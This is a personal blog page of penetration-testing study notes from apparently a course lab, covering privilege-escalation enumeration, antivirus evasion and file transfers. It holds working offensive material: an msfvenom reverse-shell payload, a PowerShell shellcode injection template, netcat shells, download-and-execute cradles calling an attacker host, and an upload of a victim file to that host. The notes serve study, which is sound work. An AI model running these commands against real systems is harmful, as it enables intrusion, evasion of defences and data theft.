<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta name="description" content="No Description"><meta name="keywords" content=""><meta name="author" content="Gavin Cui"><meta name="copyright" content="Gavin Cui"><title>No Subtitle | Gavin's Blog</title><link rel="shortcut icon" href="/melody-favicon.ico"><link rel="stylesheet" href="/css/index.css?version=1.9.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@latest/css/font-awesome.min.css?version=1.9.0"><link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.3.1/css/all.css?version=1.9.0"><meta name="format-detection" content="telephone=no"><meta http-equiv="x-dns-prefetch-control" content="on"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><script>var GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  copy: {
    success: 'Copy successfully',
    error: 'Copy error',
    noSupport: 'The browser does not support'
  },
  hexoVersion: '5.4.0'
} </script><meta name="generator" content="Hexo 5.4.0"></head><body><i class="fa fa-arrow-right" id="toggle-sidebar" aria-hidden="true"></i><div id="sidebar" data-display="false"><div class="author-info"><div class="author-info__avatar text-center"><img src="/img/avatar.png"></div><div class="author-info__name text-center">Gavin Cui</div><div class="author-info__description text-center">No Description</div><hr><div class="author-info-articles"><a class="author-info-articles__archives article-meta" href="/archives"><span class="pull-left">Articles</span><span class="pull-right">16</span></a><a class="author-info-articles__tags article-meta" href="/tags"><span class="pull-left">Tags</span><span class="pull-right">5</span></a></div></div></div><nav class="no-bg" id="nav"><div id="page-header"><span class="pull-left"> <a id="site-name" href="/">Gavin's Blog</a></span><i class="fa fa-bars toggle-menu pull-right" aria-hidden="true"></i><span class="pull-right menus">   <a class="site-page" href="/">Home</a><a class="site-page" href="/archives">Archives</a><a class="site-page" href="/tags">Tags</a></span><span class="pull-right"></span></div><div id="site-info"><div id="site-title">Gavin's Blog</div><div id="site-sub-title">No Subtitle</div><div id="site-social-icons"><a class="social-icon" href="https://github.com/Gavincrz" target="_blank" rel="noreferrer noopener nofollow"><i class="fa-github-square fab"></i></a></div></div></nav><div id="content-outer"><div class="layout" id="content-inner"><div class="recent-post-item article-container"><a class="article-title" href="/2021/03/29/Study-Notes-2021-03-29/">Study Notes - 2021/03/29</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2021-03-29</time><span class="article-meta tags"><span class="article-meta__separator">|</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/Study-Notes/">Study Notes</a><span class="article-meta__link">-</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/Penetration-Testing/">Penetration Testing</a></span><div class="content"><h1 id="Privilege-Escalation"><a href="#Privilege-Escalation" class="headerlink" title="Privilege Escalation"></a>Privilege Escalation</h1><h2 id="Manual-Enumeration"><a href="#Manual-Enumeration" class="headerlink" title="Manual Enumeration"></a>Manual Enumeration</h2><p>enumerating users:<br><code>whoami</code> work both for win and linux<br>windows: <code>net user &lt;username&gt;</code><br>Linux: <code>id</code><br>reveal other users :<br>windows: <code>net user</code><br>linux: <code>cat /etc/passwd</code>  </p>
<p>enumeratin hostname:<br><code>hostname</code>  </p>
<h2 id="Enumerating-OS-version"><a href="#Enumerating-OS-version" class="headerlink" title="Enumerating OS version"></a>Enumerating OS version</h2><p>Windows: systeminfo<br>linux: <code>cat /etc/issue</code><br><code>cat /etc/*-release</code><br><code>uname -a</code>  </p>
<h2 id="Running-processes-and-services"><a href="#Running-processes-and-services" class="headerlink" title="Running processes and services"></a>Running processes and services</h2><p><code>tasklist /SVC</code><br>/SVC                    Displays services hosted in each process.<br><strong>Does not list task run by privieleged users</strong>  </p>
<p>linux:<br><code>ps aux</code>  </p>
<h2 id="Enumerating-Network-information"><a href="#Enumerating-Network-information" class="headerlink" title="Enumerating Network information"></a>Enumerating Network information</h2><p>windows:<br><code>ipconfig /all</code><br><code>route print</code>  route information<br><code>netstat -ano</code>  network connections<br>-a display all active tcp connections<br>-n            Displays addresses and port numbers in numerical form.<br>-o            Displays the owning process ID associated with each connection.  </p>
<p>Linux:<br><code>ifconfig -a</code><br><code>ip a</code><br><code>/sbin/route</code><br><code>ss -anp</code><br><code>netstat -anp</code>  </p>
<h2 id="Enumerating-Firewall-Status-and-Rules"><a href="#Enumerating-Firewall-Status-and-Rules" class="headerlink" title="Enumerating Firewall Status and Rules"></a>Enumerating Firewall Status and Rules</h2><p>windows:<br><code>netsh advfirewall show currentprofile</code><br>list the firewall rules:<br><code>netsh advfirewall firewall show rule name=all</code>  </p>
<p>Linux: must have root privilege to access firewall rules<br>For example, the iptables-persistent464 package on Debian Linux saves firewall rules in specific<br>files under the /etc/iptables directory by default. These files are used by the system to restore<br>netfilter465 rules at boot time. These files are often left with weak permissions, allowing them to<br>be read by any local user on the target system.  </p>
<p>grep -Hs iptables /etc/*<br>-H display file name with file number<br>-s suppress error messages </p>
<h2 id="Enumerating-Scheduled-tasks"><a href="#Enumerating-Scheduled-tasks" class="headerlink" title="Enumerating Scheduled tasks"></a>Enumerating Scheduled tasks</h2><p><code>schtasks /query /fo LIST /v</code><br>/query argument displays tasks and /FO LIST sets the output format to a simple list. We can also use /V to request verbose output.</p>
<p>Linux:<br>The Linux-based job scheduler is known as Cron.467 Scheduled tasks are listed under the /etc/cron.* directories </p>
<p>ls -lah /etc/cron*  sometimes need permision<br>-h human readable  </p>
<p>cat /etc/crontab  </p>
<p>if those script have a weak permissions, we change change it and escalate pribilege  </p>
<h2 id="Enumerating-Installed-app-and-patch-levels"><a href="#Enumerating-Installed-app-and-patch-levels" class="headerlink" title="Enumerating Installed app and patch levels"></a>Enumerating Installed app and patch levels</h2><p><code>wmic product get name, version, vendor</code>  </p>
<p>We can use wmic with the <strong>product</strong> WMI class argument followed by <strong>get</strong>, which, as the name states, is used to retrieve specific property values. We can then choose the properties we are interested in, such as name, version, and vendor  </p>
<p>note: product class only list application installed by the windows installer  </p>
<p>Similarly, and more importantly, wmic can also be used to list system-wide updates by querying the Win32_QuickFixEngineering (qfe) WMI class.<br><code>wmic qfe get Caption, Description, HotFixID, InstalledOn</code>  </p>
<p>Linux:<br>Debian based:<br>dpkg -l<br>Redhat based:<br>rpm  </p>
<h2 id="Enumerating-readble-and-writable-dirs"><a href="#Enumerating-readble-and-writable-dirs" class="headerlink" title="Enumerating readble and writable dirs"></a>Enumerating readble and writable dirs</h2><p><strong>Accesschk</strong>:<br>enumerate the Program Files directory in search of any file or directory that allows the Everyone group write permissions  </p>
<p>We will use -u to suppress errors, -w to search for write access permissions, and -s to perform a recursive search.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">accesschk.exe -uws &quot;Everyone&quot; &quot;C:\Program Files&quot;</span><br></pre></td></tr></table></figure>
<p>powershell:  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-ChildItem &quot;C:\Program Files&quot; -Recurse | Get-ACL | ?&#123;$_.AccessToString -match &quot;Everyone\sAllow\s\sModify&quot;&#125;</span><br></pre></td></tr></table></figure>

<p>Linux:  -type d to locate directories</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find &#x2F; -writable -type d 2&gt;&#x2F;dev&#x2F;null  </span><br></pre></td></tr></table></figure>


<h2 id="Enumerating-Unmounted-Disks"><a href="#Enumerating-Unmounted-Disks" class="headerlink" title="Enumerating Unmounted Disks"></a>Enumerating Unmounted Disks</h2><p><code>mountvol</code><br>On Linux-based systems, we can use the <code>mount</code> command to list all mounted filesystems. In addition, the <code>/etc/fstab </code>file lists all drives that will be mounted at boot time.<br>use <code>lsblk</code> to view all available disks  </p>
<h2 id="Enumerating-Device-Drivers-and-Kernel-Modules"><a href="#Enumerating-Device-Drivers-and-Kernel-Modules" class="headerlink" title="Enumerating Device Drivers and Kernel Modules"></a>Enumerating Device Drivers and Kernel Modules</h2><p>powershell: </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">driverquery.exe &#x2F;v &#x2F;fo csv | ConvertFrom-CSV | Select-Object &#39;Display Name&#39;, &#39;Start Mode&#39;, Path</span><br></pre></td></tr></table></figure>

<p>find version number of each module: </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-WmiObject Win32_PnPSignedDriver | Select-Object DeviceName, DriverVersion, Manufacturer | Where-Object &#123;$_.DeviceName -like &quot;*VMware*&quot;&#125;</span><br></pre></td></tr></table></figure>

<p>Linux:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">lsmod</span><br><span class="line">&#x2F;sbin&#x2F;modinfo libata  </span><br></pre></td></tr></table></figure>
<p>modinfo require full path name to run  </p>
<h2 id="Enumerating-Binaries-That-AutoElevate"><a href="#Enumerating-Binaries-That-AutoElevate" class="headerlink" title="Enumerating Binaries That AutoElevate"></a>Enumerating Binaries That AutoElevate</h2><p>First, on Windows systems, we should check the status of the <code>AlwaysInstallElevated</code> registry setting. If this key is enabled (set to 1) in either <code>HKEY_CURRENT_USER</code> or <code>HKEY_LOCAL_MACHINE</code>, any user can run Windows Installer packages with elevated privileges.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer</span><br><span class="line">reg query HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\Installer</span><br></pre></td></tr></table></figure>

<p>If this setting is enabled, we could craft an MSI file and run it to elevate our privileges</p>
<p>Linux:<br>find suid-marked binaries, the binary will be executed with the file owner’s permission</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find &#x2F; -perm -u&#x3D;s -type f 2&gt;&#x2F;dev&#x2F;null</span><br></pre></td></tr></table></figure>

</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2021/03/23/Study-Notes-2021-03-24/">Study Notes - 2021/03/24</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2021-03-23</time><span class="article-meta tags"><span class="article-meta__separator">|</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/Study-Notes/">Study Notes</a><span class="article-meta__link">-</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/Penetration-Testing/">Penetration Testing</a></span><div class="content"><h1 id="Antivirus-Evasion"><a href="#Antivirus-Evasion" class="headerlink" title="Antivirus Evasion"></a>Antivirus Evasion</h1><p>First generate a reverse shell:<br>msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.11.0.4 LPORT=4444 -f exe &gt; binary.exe  </p>
<p><a target="_blank" rel="noopener" href="https://www.virustotal.com/#/home/upload">https://www.virustotal.com/#/home/upload</a>  </p>
<h1 id="Detection-Method"><a href="#Detection-Method" class="headerlink" title="Detection Method"></a>Detection Method</h1><h2 id="Signiture-based"><a href="#Signiture-based" class="headerlink" title="Signiture-based"></a>Signiture-based</h2><p>blacklist technology<br>a cotinuous series of bytes that uniquely identify it -&gt; change or obfuscating the content </p>
<h2 id="Heuristic-and-Behavioral-Based-Detection"><a href="#Heuristic-and-Behavioral-Based-Detection" class="headerlink" title="Heuristic and Behavioral-Based Detection"></a>Heuristic and Behavioral-Based Detection</h2><p>Heuristic-Based Detection is a detection method that relies on various rules and algorithms to determine whether or not an action is considered malicious</p>
<p>Behavioral-Based: This is often achieved by executing the file in question in an emulated environment, such as a small virtual machine, and looking for behaviors or actions that are considered malicious.</p>
<h1 id="Bypassing"><a href="#Bypassing" class="headerlink" title="Bypassing"></a>Bypassing</h1><h2 id="On-disk-evasion"><a href="#On-disk-evasion" class="headerlink" title="On-disk evasion"></a>On-disk evasion</h2><p>Packers, smaller, functional equivalent -&gt; new signiture, bypass older antivirus detection  </p>
<h3 id="Obfuscator"><a href="#Obfuscator" class="headerlink" title="Obfuscator"></a>Obfuscator</h3><p>Re-organize and mutate code, more difficult to reverse engineer , dead code</p>
<h3 id="Cypters"><a href="#Cypters" class="headerlink" title="Cypters"></a>Cypters</h3><p>Add a decryption step, in memory decryotion, invisible to malware detection</p>
<p>virtualmachine emulation detection, detect if it is executed in a virtual machine envrionment  </p>
<h3 id="Software-Protectors"><a href="#Software-Protectors" class="headerlink" title="Software Protectors"></a>Software Protectors</h3><h2 id="in-memory-evasion"><a href="#in-memory-evasion" class="headerlink" title="in-memory evasion"></a>in-memory evasion</h2><p>PE injection, manipulation of its own memory, does not write any thing to disk  </p>
<h3 id="Remote-Process-Memory-Injection"><a href="#Remote-Process-Memory-Injection" class="headerlink" title="Remote Process Memory Injection"></a>Remote Process Memory Injection</h3><h3 id="Reflective-DLL-injection"><a href="#Reflective-DLL-injection" class="headerlink" title="Reflective DLL injection"></a>Reflective DLL injection</h3><p>write their own version of api to load in memory dll  </p>
<h3 id="Process-Hollowing"><a href="#Process-Hollowing" class="headerlink" title="Process Hollowing"></a>Process Hollowing</h3><p>suspend a benign process, then image changed, resume executon </p>
<h3 id="Inline-Hook"><a href="#Inline-Hook" class="headerlink" title="Inline Hook"></a>Inline Hook</h3><p>modify memory, inject a hook, handler, to malicious code  </p>
<h1 id="Practical-example"><a href="#Practical-example" class="headerlink" title="Practical example"></a>Practical example</h1><p>Target a specific anti-virus product </p>
<h1 id="in-memory-injection"><a href="#in-memory-injection" class="headerlink" title="in-memory injection"></a>in-memory injection</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">$code &#x3D; &#39;</span><br><span class="line">[DllImport(&quot;kernel32.dll&quot;)]</span><br><span class="line">public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint</span><br><span class="line">flAllocationType, uint flProtect);</span><br><span class="line">[DllImport(&quot;kernel32.dll&quot;)]</span><br><span class="line">public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize,</span><br><span class="line">IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);</span><br><span class="line">[DllImport(&quot;msvcrt.dll&quot;)]</span><br><span class="line">public static extern IntPtr memset(IntPtr dest, uint src, uint count);&#39;;</span><br><span class="line">$winFunc &#x3D;</span><br><span class="line">Add-Type -memberDefinition $code -Name &quot;Win32&quot; -namespace Win32Functions -passthru;</span><br><span class="line">[Byte[]];</span><br><span class="line">[Byte[]]$sc &#x3D; &lt;place your shellcode here&gt;;</span><br><span class="line">$size &#x3D; 0x1000;</span><br><span class="line">if ($sc.Length -gt 0x1000) &#123;$size &#x3D; $sc.Length&#125;;</span><br><span class="line">$x &#x3D; $winFunc::VirtualAlloc(0,$size,0x3000,0x40);</span><br><span class="line">for ($i&#x3D;0;$i -le ($sc.Length-1);$i++) &#123;$winFunc::memset([IntPtr]($x.ToInt32()+$i),</span><br><span class="line">$sc[$i], 1)&#125;;</span><br><span class="line">$winFunc::CreateThread(0,0,$x,0,0,0);for (;;) &#123; Start-sleep 60 &#125;;</span><br></pre></td></tr></table></figure>

<p>use load code into the memory, then execute with create thread. in powershell script </p>
<p>prevent from execution:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\offsec\Desktop&gt; powershell .\av_test.ps1</span><br><span class="line">.\av_test.ps1 : File C:\Users\offsec\Desktop\av_test.ps1 cannot be loaded because</span><br><span class="line">running scripts is disabled on this</span><br><span class="line">system. For more information, see about_Execution_Policies at</span><br><span class="line">http:&#x2F;&#x2F;go.microsoft.com&#x2F;fwlink&#x2F;?LinkID&#x3D;135170.</span><br><span class="line">At line:1 char:1</span><br><span class="line">+ .\av_test.ps1</span><br><span class="line">+ ~~~~~~~~~~~~~</span><br><span class="line">+ CategoryInfo : SecurityError: (:) [], PSSecurityException</span><br><span class="line">+ FullyQualifiedErrorId : UnauthorizedAccess</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">C:\Users\offsec\Desktop&gt; powershell</span><br><span class="line">Windows PowerShell</span><br><span class="line">Copyright (C) 2015 Microsoft Corporation. All rights reserved.</span><br><span class="line">PS C:\Users\offsec\Desktop&gt; Get-ExecutionPolicy -Scope CurrentUser</span><br><span class="line">Undefined</span><br><span class="line">PS C:\Users\offsec\Desktop&gt; Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Scope</span><br><span class="line">CurrentUser</span><br><span class="line">PS C:\Users\offsec\Desktop&gt; Get-ExecutionPolicy -Scope CurrentUser</span><br><span class="line">Unrestricted</span><br></pre></td></tr></table></figure>

<h1 id="Shelter"><a href="#Shelter" class="headerlink" title="Shelter"></a>Shelter</h1><p>stealth mode: restore the execution of original flow after finish the injected code  </p>
<p>Session died after original code exit </p>
<p>we can set up an AutoRunScript to migrate our Meterpreter to a separate process immediately after session creation</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set AutoRunScript post&#x2F;windows&#x2F;manage&#x2F;migrate</span><br></pre></td></tr></table></figure>

</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2021/03/22/Study-Notes-2021-03-22/">Study Notes - 2021/03/22</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2021-03-22</time><span class="article-meta tags"><span class="article-meta__separator">|</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/Study-Notes/">Study Notes</a><span class="article-meta__link">-</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/Penetration-Testing/">Penetration Testing</a></span><div class="content"><h1 id="Fixing-Memory-Corruption-Exploits"><a href="#Fixing-Memory-Corruption-Exploits" class="headerlink" title="Fixing Memory Corruption Exploits"></a>Fixing Memory Corruption Exploits</h1><p>searchsploit -m 42341<br>copy the exploit   </p>
<h1 id="Cross-Cpmpiling-the-Exploit-Code"><a href="#Cross-Cpmpiling-the-Exploit-Code" class="headerlink" title="Cross-Cpmpiling the Exploit Code"></a>Cross-Cpmpiling the Exploit Code</h1><p>mingw-64 a cross-compiler<br>sudo apt install mingw-w64  </p>
<h1 id="Changing-the-Socket-Information"><a href="#Changing-the-Socket-Information" class="headerlink" title="Changing the Socket Information"></a>Changing the Socket Information</h1><h1 id="Change-the-payload"><a href="#Change-the-payload" class="headerlink" title="Change the payload"></a>Change the payload</h1><h1 id="Fix-Web-Exploits"><a href="#Fix-Web-Exploits" class="headerlink" title="Fix Web Exploits"></a>Fix Web Exploits</h1><p>make sure the certificate is ignored if face certificate check failed<br>python request The official documentation394 indicates that the SSL certificate will be ignored if we set the verify<br>parameter to False  </p>
<h1 id="File-Transfers"><a href="#File-Transfers" class="headerlink" title="File Transfers"></a>File Transfers</h1><h1 id="non-interactive-shell"><a href="#non-interactive-shell" class="headerlink" title="non-interactive shell"></a>non-interactive shell</h1><p>on client, we open a listening shell: nc -nvlp 4444 -e /bin/bash<br>in attack machine, connect to it nc -nv xxx.xx.xx.xxx 4444<br>if we run ftp, we lose the interaction, input not binded correctly  </p>
<h1 id="upgrading-the-non-interactive-shell"><a href="#upgrading-the-non-interactive-shell" class="headerlink" title="upgrading the non-interactive shell"></a>upgrading the non-interactive shell</h1><p>nc -nvlp 4444 -e /bin/bash<br>nc -nv 192.168.148.44 4444  </p>
<p>python -c ‘import pty; pty.spawn(“/bin/bash”)’<br>get a bash prompt, get the pty shell, good  </p>
<h1 id="Transfer-file-with-windows-hosts"><a href="#Transfer-file-with-windows-hosts" class="headerlink" title="Transfer file with windows hosts"></a>Transfer file with windows hosts</h1><p>Non-interative ftp download<br>sudo cp /usr/share/windows-resources/binaries/nc.exe /ftphome/  </p>
<p>home directory of ftp is set to /ftphome/  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\offsec&gt;echo open 10.11.0.4 21&gt; ftp.txt</span><br><span class="line">C:\Users\offsec&gt;echo USER offsec&gt;&gt; ftp.txt</span><br><span class="line">C:\Users\offsec&gt;echo lab&gt;&gt; ftp.txt</span><br><span class="line">C:\Users\offsec&gt;echo bin &gt;&gt; ftp.txt  # request a binary file transfer</span><br><span class="line">C:\Users\offsec&gt;echo GET nc.exe &gt;&gt; ftp.txt</span><br><span class="line">C:\Users\offsec&gt;echo bye &gt;&gt; ftp.txt</span><br><span class="line"></span><br><span class="line">ftp -v -n -s:ftp.txt</span><br></pre></td></tr></table></figure>
<p>-v to suppress any returned output, -n to suppresses automatic<br>login, and -s to indicate the name of our command file.  </p>
<h1 id="Windows-Downloads-using-scripting-languages"><a href="#Windows-Downloads-using-scripting-languages" class="headerlink" title="Windows Downloads using scripting languages"></a>Windows Downloads using scripting languages</h1><p>Use vb script</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">echo strUrl &#x3D; WScript.Arguments.Item(0) &gt; wget.vbs</span><br><span class="line">echo StrFile &#x3D; WScript.Arguments.Item(1) &gt;&gt; wget.vbs</span><br><span class="line">echo Const HTTPREQUEST_PROXYSETTING_DEFAULT &#x3D; 0 &gt;&gt; wget.vbs</span><br><span class="line">echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG &#x3D; 0 &gt;&gt; wget.vbs</span><br><span class="line">echo Const HTTPREQUEST_PROXYSETTING_DIRECT &#x3D; 1 &gt;&gt; wget.vbs</span><br><span class="line">echo Const HTTPREQUEST_PROXYSETTING_PROXY &#x3D; 2 &gt;&gt; wget.vbs</span><br><span class="line">echo Dim http, varByteArray, strData, strBuffer, lngCounter, fs, ts &gt;&gt; wget.vbs</span><br><span class="line">echo Err.Clear &gt;&gt; wget.vbs</span><br><span class="line">echo Set http &#x3D; Nothing &gt;&gt; wget.vbs</span><br><span class="line">echo Set http &#x3D; CreateObject(&quot;WinHttp.WinHttpRequest.5.1&quot;) &gt;&gt; wget.vbs</span><br><span class="line">echo If http Is Nothing Then Set http &#x3D; CreateObject(&quot;WinHttp.WinHttpRequest&quot;) &gt;&gt;</span><br><span class="line">wget.vbs</span><br><span class="line">echo If http Is Nothing Then Set http &#x3D; CreateObject(&quot;MSXML2.ServerXMLHTTP&quot;) &gt;&gt;</span><br><span class="line">wget.vbs</span><br><span class="line">echo If http Is Nothing Then Set http &#x3D; CreateObject(&quot;Microsoft.XMLHTTP&quot;) &gt;&gt; wget.vbs</span><br><span class="line">echo http.Open &quot;GET&quot;, strURL, False &gt;&gt; wget.vbs</span><br><span class="line">echo http.Send &gt;&gt; wget.vbs</span><br><span class="line">echo varByteArray &#x3D; http.ResponseBody &gt;&gt; wget.vbs</span><br><span class="line">echo Set http &#x3D; Nothing &gt;&gt; wget.vbs</span><br><span class="line">echo Set fs &#x3D; CreateObject(&quot;Scripting.FileSystemObject&quot;) &gt;&gt; wget.vbs</span><br><span class="line">echo Set ts &#x3D; fs.CreateTextFile(StrFile, True) &gt;&gt; wget.vbs</span><br><span class="line">echo strData &#x3D; &quot;&quot; &gt;&gt; wget.vbs</span><br><span class="line">echo strBuffer &#x3D; &quot;&quot; &gt;&gt; wget.vbs</span><br><span class="line">echo For lngCounter &#x3D; 0 to UBound(varByteArray) &gt;&gt; wget.vbs</span><br><span class="line">echo ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1, 1))) &gt;&gt; wget.vbs</span><br><span class="line">echo Next &gt;&gt; wget.vbs</span><br><span class="line">echo ts.Close &gt;&gt; wget.vbs</span><br></pre></td></tr></table></figure>

<p>C:\Users\Offsec&gt; cscript wget.vbs <a target="_blank" rel="noopener" href="http://10.11.0.4/evil.exe">http://10.11.0.4/evil.exe</a> evil.exe  </p>
<p>Use powershell :</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\Offsec&gt; echo $webclient &#x3D; New-Object System.Net.WebClient &gt;&gt;wget.ps1</span><br><span class="line">C:\Users\Offsec&gt; echo $url &#x3D; &quot;http:&#x2F;&#x2F;10.11.0.4&#x2F;evil.exe&quot; &gt;&gt;wget.ps1</span><br><span class="line">C:\Users\Offsec&gt; echo $file &#x3D; &quot;new-exploit.exe&quot; &gt;&gt;wget.ps1</span><br><span class="line">C:\Users\Offsec&gt; echo $webclient.DownloadFile($url,$file) &gt;&gt;wget.ps1</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\Offsec&gt; powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -</span><br><span class="line">NoProfile -File wget.ps1</span><br></pre></td></tr></table></figure>

<p>First, we must allow execution of PowerShell scripts (which is restricted by default) with the -<br>ExecutionPolicy keyword and Bypass value. Next, we will use -NoLogo and -NonInteractive<br>to hide the PowerShell logo banner and suppress the interactive PowerShell prompt, respectively.<br>The -NoProfile keyword will prevent PowerShell from loading the default profile (which is not<br>needed), and finally we specify the script file with -File: </p>
<p>one line version </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\Offsec&gt; powershell.exe (New-Object System.Net.WebClient).DownloadFile(&#39;http:&#x2F;&#x2F;10.11.0.4&#x2F;evil.exe&#39;, &#39;new-exploit.exe&#39;)</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\Offsec&gt; powershell.exe IEX (New-Object System.Net.WebClient).DownloadString(&#39;http:&#x2F;&#x2F;10.11.0.4&#x2F;helloworld.ps1&#39;)</span><br></pre></td></tr></table></figure>
<p>download and execute without save to disk  </p>
<h1 id="Download-with-exe2hex-and-powershell"><a href="#Download-with-exe2hex-and-powershell" class="headerlink" title="Download with exe2hex and powershell"></a>Download with exe2hex and powershell</h1><p><code>upx -9 nc.exe</code> compress the binary file<br><code>exe2hex -x nc.exe -p nc.cmd  </code>  </p>
<p>pipling the file into clipboard:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat nc.cmd | xclip -selection clipboard</span><br></pre></td></tr></table></figure>

<p>oaste it into the non-interactive shell  </p>
<h1 id="windows-upload-using-windows-scripting-language"><a href="#windows-upload-using-windows-scripting-language" class="headerlink" title="windows upload using windows scripting language"></a>windows upload using windows scripting language</h1><p>host a upload http server  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$uploaddir &#x3D; &#39;&#x2F;var&#x2F;www&#x2F;uploads&#x2F;&#39;;</span><br><span class="line">$uploadfile &#x3D; $uploaddir . $_FILES[&#39;file&#39;][&#39;name&#39;];</span><br><span class="line">move_uploaded_file($_FILES[&#39;file&#39;][&#39;tmp_name&#39;], $uploadfile)</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>sudo mkdir /var/www/uploads<br>sudo chown www-data: /var/www/uploads   </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell (New-Object System.Net.WebClient).UploadFile(&#39;http:&#x2F;&#x2F;10.11.0.4&#x2F;upload.php&#39;, &#39;important.docx&#39;)</span><br></pre></td></tr></table></figure>

